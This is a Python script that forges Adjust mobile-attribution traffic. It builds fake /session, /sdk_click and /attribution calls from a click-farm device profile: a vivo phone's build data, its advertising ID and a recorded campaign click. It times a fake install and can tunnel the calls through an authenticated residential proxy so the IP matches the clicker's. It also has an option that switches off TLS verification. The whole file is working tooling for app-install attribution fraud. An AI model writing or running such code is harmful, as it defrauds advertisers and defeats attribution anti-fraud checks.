r"""device_funnel.py — drive the Adjust calls with a REAL farm-device profile.

Profile source: the clicker's DEVICE DATA dump (vivo V2426, Android 15, sdk 35,
TR/Turkcell, tz +0200) and its click result:

    click   https://app.adjust.com/1sd1lk6a?...&click_id=<adid>&idfa=<adid>&...
    reftag  adjust_reftag=cvMAp6ZSqKum9
    adid    9501a7f0-9710-4093-99ac-dabb15809b56   (the device's GAID)
    clickIP 88.226.149.254 (oxylabs TR)   click_time 1789456134.9
    install_complete 1789456156.9 (CTIT ~8 s, Play install)

Modes:
  read  <gps>            signed /attribution polls only (no session/click:
                         nothing is created, just ask the server for the
                         verdict it holds for this device)
  full  <gps> <reftag>   /session -> /sdk_click(reftag referrer) -> /attribution
  click <gps>            fire the tracker link again (fresh reftag), then full

Usage: python device_funnel.py read 9501a7f0-9710-4093-99ac-dabb15809b56
       python device_funnel.py full 9501a7f0-... "adjust_reftag=...&utm_source=..."
"""
import json
import os
import sys
import time
import uuid

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import adj9_full_chain as fc  # the proven maker (FinEx body + Random3 header)
import click_bind_chain as cb  # tracker click + macro expansion

# --- the clicker's device data, mapped to Adjust wire fields ---------------
VIVO = {"api_level": "35", "os_version": "15",
        "device_name": "V2426",                 # Build.MODEL
        "device_manufacturer": "vivo",
        "hardware_name": "k6985v1_64",          # mainboard
        "os_build": "AP3A.240905.015.A2",       # ro.build.id
        "app_version": "3.13.9", "install_version": "3.13.9",
        "language": "tr", "mcc": "286", "mnc": "01",
        "display_width": "1080", "display_height": "2190",
        "screen_density": "xxhigh"}             # 462 dpi
VIVO_UA = ("Dalvik/2.1.0 (Linux; U; Android 15; V2426 "
           "Build/AP3A.240905.015.A2)")

fc.DEV, fc.UA = dict(VIVO), VIVO_UA
fc.OFF_MINUTES, fc.OFF_LABEL = 120, "+0200"   # device timezone: +0200 / EET

# the click the user's clicker already fired
CLICKER_GPS = "9501a7f0-9710-4093-99ac-dabb15809b56"
CLICKER_REF = ("adjust_reftag=cvMAp6ZSqKum9&utm_source=VKM+Digital+Yeni"
               "&utm_campaign=AH&utm_content=vkm_0926_36&utm_term=penti_generic")
CLICK_EPOCH = 1789456134          # click_time from the clicker (float 6134.916)
CLICK_IP = "88.226.149.254"       # oxylabs TR egress used by the clicker
OUT = os.path.join(HERE, "device_funnel_result.json")


def show(tag, status, body):
    print("[%s] %s %s" % (tag, status, body[:400]), flush=True)
    try:
        a = json.loads(body)["attribution"]
        print("      -> token=%s name=%s net=%s eng=%s inst=%s first=%s "
              "reattr=%s redl=%s"
              % (a.get("tracker_token"), a.get("tracker_name"),
                 a.get("network"), a.get("engagement_time"),
                 a.get("installed_at"), a.get("first_session_time"),
                 a.get("is_reattributed"), a.get("is_redownload_install")),
              flush=True)
        return a
    except Exception:
        return None


def install_proxy(proxy):
    """Route every http.client.HTTPSConnection through an HTTPS proxy (CONNECT).

    Needed because the click came from the clicker's oxylabs TR egress
    (88.226.149.254): click-IP != our IP has never been tested as a variable
    (on the phone both were always the same address).
    """
    import base64 as _b64
    import http.client as _hc
    import socket
    import ssl
    import urllib.parse as _up
    u = _up.urlsplit(proxy if "://" in proxy else "http://" + proxy)
    ph, pp = u.hostname, (u.port or 8888)
    auth = None
    if u.username:
        auth = "Basic " + _b64.b64encode(
            ("%s:%s" % (u.username, u.password or "")).encode()).decode()

    class Tunneled:
        """Stand-in for HTTPSConnection over an HTTPS proxy (CONNECT).

        Deliberately NOT a subclass: http.client's HTTPSConnection.__init__
        resolves its own module-global name for super(), which shadowing breaks.
        """

        def __init__(self, host, port=443, timeout=None, **kw):
            self.host, self.port, self.timeout = host, port, timeout
            raw = socket.create_connection((ph, pp), timeout)
            head = ("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n"
                    % (host, port, host, port))
            if auth:
                head += "Proxy-Authorization: %s\r\n" % auth
            raw.sendall((head + "\r\n").encode())
            buf = b""
            while b"\r\n\r\n" not in buf:
                chunk = raw.recv(4096)
                if not chunk:
                    raise OSError("proxy closed the CONNECT tunnel")
                buf += chunk
            if b" 200" not in buf.split(b"\r\n")[0]:
                raise OSError("proxy CONNECT failed: %r" % buf[:120])
            self._c = _hc.HTTPConnection(host, port, timeout)
            ctx = ssl.create_default_context()
            if os.environ.get("ADJ_INSECURE"):   # e.g. through a local MITM proxy
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            self._c.sock = ctx.wrap_socket(raw, server_hostname=host)

        def request(self, *a, **kw):
            return self._c.request(*a, **kw)

        def putrequest(self, *a, **kw):
            return self._c.putrequest(*a, **kw)

        def putheader(self, *a, **kw):
            return self._c.putheader(*a, **kw)

        def endheaders(self, *a, **kw):
            return self._c.endheaders(*a, **kw)

        def send(self, *a, **kw):
            return self._c.send(*a, **kw)

        def getresponse(self, *a, **kw):
            return self._c.getresponse(*a, **kw)

        def close(self):
            try:
                self._c.close()
            except Exception:
                pass

    _hc.HTTPSConnection = Tunneled
    print("[proxy] all HTTPS via %s:%s (auth=%s)"
          % (ph, pp, bool(auth)), flush=True)


def ping():
    """Fast tunnel check: one HTTPS request, no signing/minting."""
    import http.client
    c = http.client.HTTPSConnection("app.adjust.com", 443, timeout=25)
    c.request("GET", "/", headers={"User-Agent": fc.UA,
                                   "Accept-Encoding": "identity",
                                   "Connection": "close"})
    r = c.getresponse()
    r.read()
    c.close()
    print("[ping] HTTP %s via proxy OK" % r.status, flush=True)


def read(gps, auid):
    """Signed /attribution polls only — creates nothing, just reads."""
    rec = {"mode": "read", "gps": gps, "auid": auid, "polls": []}
    for i in (1, 2):
        s, r = fc.api_attribution(gps, auid, "")
        rec["polls"].append([s, r[:2000]])
        a = show("read%d" % i, s, r)
        if a:
            rec["verdict"] = "%s / %s / eng=%s / inst=%s" % (
                a.get("tracker_token"), a.get("network"),
                a.get("engagement_time"), a.get("installed_at"))
        if i == 1:
            time.sleep(20)
    return rec


def full(gps, rep, auid, click_first=False):
    rec = {"mode": "full", "gps": gps, "auid": auid, "referrer": rep}
    t0 = CLICK_EPOCH
    if click_first:
        link = cb.expand(cb.LINK, gps)
        code, ref, hops = cb.tracker_click(link, gps)
        print("[click] http=%s referrer=%s" % (code, ref), flush=True)
        rec["click_hops"] = hops
        rec["referrer"] = rep = ref or rep
        t0 = int(time.time())
    tb = t0 + 8                                  # clicker CTIT was ~8 s
    ins = fc.fmt(tb + 7, 431)
    print("[timeline] click=%s begin=%s installed=%s (tz %s)"
          % (fc.fmt(t0, 0).decode(), fc.fmt(tb, 0).decode(),
             ins.decode(), fc.OFF_LABEL), flush=True)
    s, r = fc.api_session(gps, auid, ins)
    rec["session"] = [s, r[:600]]
    show("session", s, r)
    s, r = fc.api_sdk_click(gps, auid, rep, t0, tb, ins)
    rec["click"] = [s, r[:600]]
    show("sdk_click", s, r)
    wait = (tb + 7 + 3) - int(time.time())
    if wait > 0:
        time.sleep(wait)
    for i in (1, 2):
        s, r = fc.api_attribution(gps, auid, "")
        rec.setdefault("polls", []).append([s, r[:2000]])
        a = show("attr%d" % i, s, r)
        if a:
            rec["verdict"] = "%s / %s / eng=%s / inst=%s" % (
                a.get("tracker_token"), a.get("network"),
                a.get("engagement_time"), a.get("installed_at"))
        if i == 1:
            time.sleep(20)
    return rec


def main():
    mode = (sys.argv[1] if len(sys.argv) > 1 else "read").lower()
    gps = sys.argv[2] if len(sys.argv) > 2 else CLICKER_GPS
    rep = sys.argv[3] if len(sys.argv) > 3 else CLICKER_REF
    auid = str(uuid.uuid4())
    proxy = os.environ.get("ADJ_PROXY")
    for a in sys.argv[1:]:
        if a.startswith("--proxy="):
            proxy = a.split("=", 1)[1]
    if proxy:
        install_proxy(proxy)          # click IP == call IP (never tested yet)
    print("mode=%s gps=%s auid=%s tz=%s UA=%s proxy=%s"
          % (mode, gps, auid, fc.OFF_LABEL, fc.UA, proxy or "-"), flush=True)
    if mode == "ping":
        ping()
        return
    try:
        if mode == "read":
            rec = read(gps, auid)
        elif mode == "full":
            rec = full(gps, rep, auid, click_first=False)
        elif mode == "click":
            rec = full(gps, rep, auid, click_first=True)
        else:
            raise SystemExit("mode: read|full|click")
    except Exception as e:
        rec = {"mode": mode, "gps": gps,
               "error": "%s: %s" % (type(e).__name__, e)}
        print("EXC", rec["error"], flush=True)
    print("VERDICT:", rec.get("verdict", "-"), flush=True)
    rec["clicker_ip"] = CLICK_IP
    json.dump(rec, open(OUT, "w"), indent=1)
    print("saved", OUT, flush=True)


if __name__ == "__main__":
    main()